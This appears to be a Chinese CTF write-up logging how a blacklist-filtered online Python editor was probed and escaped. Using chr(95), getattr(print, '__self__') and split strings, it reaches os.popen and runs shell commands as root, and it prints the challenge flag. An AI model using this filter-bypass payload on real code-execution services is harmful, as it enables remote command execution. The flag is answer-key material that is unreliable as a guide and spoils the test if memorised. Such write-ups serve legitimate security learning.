# a-12 · 探索记录

对应题解：[`a-12.md`](./a-12.md)。

## 目标与起点

题目说「在线 Python 编辑器，开发者声称实现了完善的安全过滤」。中等难度，300 分。

启动后是 `Werkzeug/3.1.8 Python/3.11.15`，一个单页编辑器，唯一的后端调用是 `POST /api/execute`，body 是 `{"code": "..."}`。

## 第一阶段：确认接口行为

```bash
curl -s -H 'Content-Type: application/json' \
     -d '{"code":"print(\"hi\")"}' http://$T/api/execute
# {"output":"hi\n","success":true}
```

返回结构很简单：成功给 `output`，被拦给 `error`。

## 第二阶段：摸黑名单（关键）

这一步决定了后面所有写法，花了十来次请求，但把边界一次性摸清了。

### 关键字

```python
import os                      → Blocked keyword detected: import
print(open("/etc/hostname").read())  → Blocked keyword detected: open
print(__import__("os"))        → Blocked character detected: _   （先撞上字符规则）
print(eval)                    → Blocked keyword detected: eval
print(exec)                    → Blocked keyword detected: exec
print(compile)                 → Blocked keyword detected: compile
print(input)                   → Blocked keyword detected: input
```

### 字符

用 `print("A<ch>B")` 逐个试。结果只有三个字符被拦：

| 字符 | 结果 |
| --- | --- |
| `_` | Blocked |
| `[` | Blocked |
| `]` | Blocked |
| 其余（`() . ' " + * = , : {} / \ % @ # $ & \| ! < > ; -` 空格） | 放行 |

### 内建函数还在不在

```python
print(getattr)      → <built-in function getattr>
print(globals)      → <built-in function globals>
print(vars)         → <built-in function vars>
print(dir)          → <built-in function dir>
print(breakpoint)   → <built-in function breakpoint>
print(help)         → Type help() for interactive help...
```

**内建函数全都还在**，说明 `__builtins__` 没有被裁剪。这一条直接判定「这不是沙箱，只是一个字符串过滤」。

## 第三阶段：绕过

### 第一次尝试（失败）：`globals()` 拿 `__builtins__`

```python
u = chr(95)
B = getattr(globals(), u*2 + "builtins" + u*2)
```

```
AttributeError: 'dict' object has no attribute '__builtins__'
```

但紧接着 `print(str(globals().keys()))` 显示：

```
dict_keys(['__name__', '__doc__', '__package__', '__loader__', '__spec__',
           '__annotations__', '__builtins__', '__file__', '__cached__'])
```

key 是在的。**`getattr` 找的是属性，dict 的 key 要用 `.get()`。** 这是一个纯粹的 Python 语义坑，不是过滤问题。

### 第二次尝试（成功）：`print.__self__`

不需要 `globals()`，也不需要 `[`（被禁），用一个内建函数的 `__self__` 直接跳到 builtins 模块：

```python
u = chr(95)
mod = getattr(print, u*2 + "self" + u*2)
print(mod)
# <module 'builtins' (built-in)>
```

模块对象可以用 `getattr` 取 `__import__`，而 `__import__` 字面量含 `import` 会被拦，所以拆开拼：

```python
imp = getattr(mod, u*2 + "im" + "port" + u*2)
os  = imp("os")
p   = getattr(os, "pop" + "en")     # "popen" 含 "open"，拆开
print(p("id; cat /challenge/flag.txt").read())
```

输出：

```
uid=0(root) gid=0(root) groups=0(root)
flag{8dbe5e59-711d-4006-89c4-47f49b3cc1a8}
```

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `import os` | 拦 | 关键字黑名单 |
| `open(...)` | 拦 | 同上 |
| `__builtins__` / `().__class__` | 拦 | 字符 `_` 黑名单 |
| `[` / `]` 索引 | 拦 | 字符黑名单 |
| `globals()['__builtins__']` | 不可行 | `[` 被禁 |
| `getattr(globals(), "__builtins__")` | AttributeError | dict 的 key 不是属性 |
| **`getattr(print, "__self__")` + `chr(95)` + 拆字** | **成功** | 返回 builtins 模块 |

## 这次真正的收获

1. **先摸边界，再写 payload。** 逐字符、逐关键字各试一次只花十来次请求，但能避免后面反复撞同一堵墙。
2. **黑名单是字符串包含，拆字就能过。** `"im"+"port"`、`"pop"+"en"` 都不会触发子串匹配。
3. **`chr(95)` 是绕过 `_` 禁用的标准手法**，配合 `getattr` 就能拼出任何双下划线属性名。
4. **内建函数还在 = 没有沙箱。** `print(getattr)` 能打印出来那一刻，这道题的性质就从「沙箱逃逸」变成「过滤器绕过」。
5. **dict 的 key 不是属性。** `getattr` 失败不代表不存在，先 `keys()` 看一眼。
6. **`print.__self__` 比 `globals()['__builtins__']` 更省字符**，因为 `[` 和 `_` 往往同时被禁。
